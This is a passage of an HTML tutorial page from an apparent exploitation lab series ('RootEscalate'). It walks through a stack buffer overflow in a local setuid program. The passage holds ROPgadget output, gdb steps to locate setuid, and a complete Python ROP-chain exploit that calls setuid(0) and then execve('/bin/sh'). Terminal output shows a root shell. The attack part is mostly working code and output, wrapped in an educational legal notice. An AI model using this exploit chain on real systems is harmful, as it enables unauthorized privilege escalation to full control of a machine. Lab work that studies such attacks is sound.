+0x0000555555559000 0x000055555557a000 0x21000            0x0                rw-p  [heap]
+0x00007ffff7dc4000 0x00007ffff7dc7000 0x3000             0x0                rw-p
+0x00007ffff7dc7000 0x00007ffff7def000 0x28000            0x0                r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7def000 0x00007ffff7f52000 0x163000           0x28000            r-xp  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7f52000 0x00007ffff7fa8000 0x56000            0x18b000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7fa8000 0x00007ffff7fac000 0x4000             0x1e0000           r--p  /usr/lib/x86_64-linux-gnu/libc.so.6
+0x00007ffff7fac000 0x00007ffff7fae000 0x2000             0x1e4000           rw-p  /usr/lib/x86_64-linux-gnu/libc.so.6
+...	    
+</code></pre>
+
+
+<p> By executing the ROPgadget tool, it is possible to identify instructions from libraries loaded in memory that can be reused to achieve our exploitation objective. The generated output is redirected to a file named ROPs.txt, which will allow us to analyze the set of instructions that were found. </p>
+	    <br>
+            <h3>ROPgadget Gadget Generation</h3>
+            <div class="terminal">
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --offset 7ffff7dc7000 --ropchain > ROPs.txt</div>
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> tail -n 80 ROPs.txt</div>
+		    <p># Padding goes here</p>
+    <p>p = b''</p>
+    <p></p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7fac000) # @ .data</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e0ac43) # pop rax ; ret</p>
+    <p>p += b'/bin//sh'</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7df1145) # pop rdi ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7fac000) # @ .data</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7df2aa9) # pop rsi ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7e95a50) # add rax, 1 ; ret</p>
+    <p>...</p>
+    <p>Repetir 58 veces más la misma instrucción</p>
+    <p>...</p>
+    <p>p += pack('&lt;Q', 0x00007ffff7def505) # syscall</p>
+
+            </div>
+
+	    <h3>setuid Address</h3>
+
+<p> At this point, it is possible to build the exploit; however, it would not directly allow privilege escalation to root. </p>
+
+<div class="alert alert-warning"> <i class="fas fa-exclamation-triangle"></i> <strong>Important:</strong> This is because, in order to achieve execution with superuser privileges, it is necessary to first invoke the function <a href="https://x64.syscall.sh/" target="_blank" style="color:#e74c3c;">setuid(0)</a>, where the parameter 0 indicates that the process must continue execution with root privileges.<br> Therefore, it is necessary to identify the address of the <code>setuid</code> function, as well as prepare the $rdi register with the value 0 before invoking it. To accomplish this objective, we proceed with the following actions from the gdb debugger: </div>
+
+            <pre><code class="language-gdb">
+Reading symbols from display_root.exe...
+(No debugging symbols found in display_root.exe)
+(gdb) break main
+Breakpoint 1 at 0x123a
+(gdb) run
+Starting program: /home/debian/ENG/LAB2/display_root.exe
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x000055555555523a in main ()
+(gdb) print setuid
+$1 = {&lt;text variable, no debug info&gt;} 0x7ffff7ebfbe0 <setuid>	    
+	    </code></pre>
+
+	    <p> With all the information previously gathered, we proceed to generate the file <code>exploit1.py</code>, which will allow us to carry out the exploitation of the analyzed vulnerability. <br> </p>
+            
+        </div>
+
+        <!-- EXPLOIT COMPLETO -->
+        <div id="exploit" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-bolt"></i>
+                PYTHON EXPLOIT
+            </h2>
+            
+	    <h3>exploit1.py - Root Privilege Escalation with setuid(0)</h3>
+            <div class="numbered-code">
+                <pre><code class="language-python" id="exploit-codigo">#!/usr/bin/python3
+from struct import pack
+import sys
+
+test = b""
+test += b'\x41' * 248  # offset
+
+rip = b''
+
+#  SETUID(0) 
+rip += pack('&lt;Q', 0x00007ffff7df1145) # pop rdi ; ret
+rip += pack('&lt;Q', 0x0000000000000000) # rdi = 0 (UID root)
+rip += pack('&lt;Q', 0x00007ffff7ebfbe0) # llamar a setuid
+
+#  ESCRIBIR "/bin/sh" EN .data 
+rip += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
+rip += pack('&lt;Q', 0x00007ffff7fac000) # @ .data
+rip += pack('&lt;Q', 0x00007ffff7e0ac43) # pop rax ; ret
+rip += b'/bin//sh'
+rip += pack('&lt;Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret
+
+#  NULL TERMINATOR 
+rip += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
+rip += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8
+rip += pack('&lt;Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret
+rip += pack('&lt;Q', 0x00007ffff7dffb4c) # mov qword ptr [rdx], rax ; ret
+
+#  EXECVE("/bin/sh") 
+rip += pack('&lt;Q', 0x00007ffff7df1145) # pop rdi ; ret
+rip += pack('&lt;Q', 0x00007ffff7fac000) # @ .data
+rip += pack('&lt;Q', 0x00007ffff7df2aa9) # pop rsi ; ret
+rip += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8
+rip += pack('&lt;Q', 0x00007ffff7e7bbaa) # pop rdx ; ret
+rip += pack('&lt;Q', 0x00007ffff7fac008) # @ .data + 8
+rip += pack('&lt;Q', 0x00007ffff7e81bc5) # xor rax, rax ; ret
+
+rip += pack('&lt;Q', 0x00007ffff7e0ac43) # pop rax ; ret
+rip += pack('&lt;Q', 0x000000000000003b) # rax = 0x3b (execve)
+rip += pack('&lt;Q', 0x00007ffff7def505) # syscall
+
+sys.stdout.buffer.write(test + rip + b'\x0a')</code></pre>
+            </div>
+
+	    <h3>Exploit Execution</h3>
+ <p> We proceed to generate the <code>contenido.txt</code> file by executing our exploit and then verify the total size of the generated file. </p>
+
+            <div class="terminal">
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> python3 exploit1.py > contenido.txt</div>
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> wc -c contenido.txt</div>
+                <div class="terminal-output">425 contenido.txt</div>
+            </div>
+
+	    <p> Finally, we exploit the program's vulnerability. </p>
+
+            <div class="terminal">
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> ./display_root.exe 425</div>
+                <div class="terminal-output">Contenido del archivo:</div>
+                <div class="terminal-output">AAAAAAAAAAAAAAAA...(248 A's)...E▒▒</div>
+                <div class="terminal-output">Tamaño original de la cadena 425</div>
+
+                <div style="color: #2ecc71;"># id</div>
+                <div class="terminal-output">uid=0(root) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(bluetooth)</div>
+            </div>
+
+
+            <div class="alert alert-success">
+                <i class="fas fa-crown"></i>
+		<strong>ROOT ACCESS ACHIEVED!</strong> The exploitation was successfully carried out, achieving maximum privileges (root) and full control of the system.
+            </div>
+
+        </div>
+
+        <!-- TABLA RESUMEN -->
+        <div id="resumen" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-chart-simple"></i>
+                TECHNICAL SUMMARY
+            </h2>
+            
+            <table class="data-table">
+                <thead>
+		    <tr><th>Parameter</th><th>Value</th></tr>
+                </thead>
+                <tbody>
+		    <tr><td>Offset to RIP</td><td><strong>248 bytes</strong></td></tr> <tr><td>Vulnerable buffer size</td><td>233 bytes</td></tr> <tr><td>Vulnerable function</td><td>Funcion_C (memcpy)</td></tr> <tr><td>Final payload</td><td>425 bytes</td></tr> <tr><td>setuid address</td><td>0x7ffff7ebfbe0</td></tr>
+                </tbody>
+             </table>
+        </div>
+
+
+	<!-- TOOLS / RESOURCES --> <div id="herramientas" class="section-card"> <h2 class="section-title"><i class="fas fa-toolbox"></i> TOOLS USED</h2> <div class="resource-grid"> <div class="resource-card"><i class="fas fa-bug"></i><h4>GDB</h4><p>Debugging and dynamic analysis</p></div> <div class="resource-card"><i class="fas fa-link"></i><h4>ROPgadget</h4><p>ROP gadget discovery</p></div> <div class="resource-card"><i class="fas fa-code"></i><h4>Python3 + struct</h4><p>Exploit development</p></div> <div class="resource-card"><i class="fas fa-skull"></i><h4>libc.so.6</h4><p>Gadgets and syscalls</p></div> </div> </div>
+
+                <!-- AVISO LEGAL -->
+                <div class="alert alert-danger text-center">
+                    <center><i class="fas fa-gavel"></i><strong>LEGAL NOTICE:</strong> This content is intended solely for educational and research purposes. Exploiting vulnerabilities without explicit authorization is illegal. Perform these activities exclusively in controlled environments that you own.</center>
+                </div>
+
+            </div> 
+
+	    <!--
+            <div class="sidebar">
+                <div class="book-card">
+                    <div class="book-icon"><i class="fas fa-book"></i></div>
+                    <h3>El arte de la explotación de vulnerabilidades en sistemas modernos</h3>
+                    <p style="text-align: justify;">Si después de realizar los laboratorios despertaste tu interés, encendiste tu curiosidad o sentiste el impulso de profundizar en el fascinante mundo de la explotación de vulnerabilidades, te invito a continuar tu aprendizaje con el libro: <strong style="color: #FFFFFF;">El arte de la explotación de vulnerabilidades en sistemas modernos</strong>, una puerta hacia el dominio de técnicas avanzadas.</p>
+                    <div class="book-gif"><img src="U.gif" alt="Libro animado" style="width: 100%; max-width: 350px; display: block; margin: 0 auto; border-radius: 12px;"></div>
+                    <a href="get_book.html" style="text-decoration: none; color: inherit;"><div class="book-action"><i class="fas fa-shopping-cart"></i> Adquirir el libro</div></a>
+                    <div class="book-divider"></div>
+                    <h4><i class="fas fa-shield-alt"></i> Contenido destacado:</h4>
+                    <ul><li>✓ Principios de memoria, ingeniería inversa y depuración</li><li>✓ Mecanismos modernos de protección (ASLR, DEP, canarios de pila)</li><li>✓ Técnicas de evasión: ROP chaining, shellcodes personalizados</li><li>✓ Evasión perimetral IDS/IPS y Antivirus</li><li>✓ Explotación remota y comunicación inversa</li><li>✓ Encadenamiento de funciones y elevación de privilegios</li></ul>
+                    <div class="book-divider"></div>
+                    <p class="book-conclusion" style="text-align: justify;"><strong>Conclusión:</strong> Al finalizar esta obra, no solo habrás aprendido a explotar vulnerabilidades: habrás desarrollado la mentalidad de un verdadero experto en seguridad ofensiva.</p>
+                    <a href="get_book.html" style="text-decoration: none; color: inherit;"><div class="book-action"><i class="fas fa-shopping-cart"></i> Adquirir el libro</div></a>
+                </div>
+            </div>
+
+	    -->
+
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p><i class="fas fa-crown"></i> RootEscalate | Vulnerability Exploitation Laboratory - BOF</p>
+        <p style="margin-top: 0.5rem; font-size: 0.85rem;">
+            <a href="inicio.html" style="color: #e74c3c; text-decoration: none;">← Back to the Main Portal</a> |
+            <a href="Lab_1.html" style="color: #e74c3c; text-decoration: none;">Laboratory 1 (Reverse Shell) →</a>
+        </p>
+    </footer>
+
+    <script>
+        hljs.highlightAll();
+
+        // Botones de copiar
+        document.querySelectorAll('pre').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+            block.style.position = 'relative';
+            block.appendChild(btn);
+            btn.addEventListener('click', () => {
+                const code = block.querySelector('code');
+                const text = code ? code.innerText : block.innerText;
+                navigator.clipboard.writeText(text);
+                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                setTimeout(() => { btn.innerHTML = '<i class="fas fa-copy"></i> Copy'; }, 2000);
+            });
+        });
+
+        // Navegación interna suave
+        document.querySelectorAll('.submenu a, .nav-link[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                const href = this.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    e.preventDefault();
+                    const targetId = href.substring(1);
+                    const target = document.getElementById(targetId);
+                    if (target) {
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                }
+            });
+        });
+
+        // Soporte para móviles: toggle en submenús
+        if (window.innerWidth <= 1024) {
+            document.querySelectorAll('.nav-item').forEach(item => {
+                const link = item.querySelector('.nav-link');
+                if(link && item.querySelector('.submenu') && !link.href) {
+                    link.addEventListener('click', (e) => {
+                        e.preventDefault();
+                        item.classList.toggle('active');
+                    });
+                }
+            });
+        }
+    </script>
+</body>
+</html>
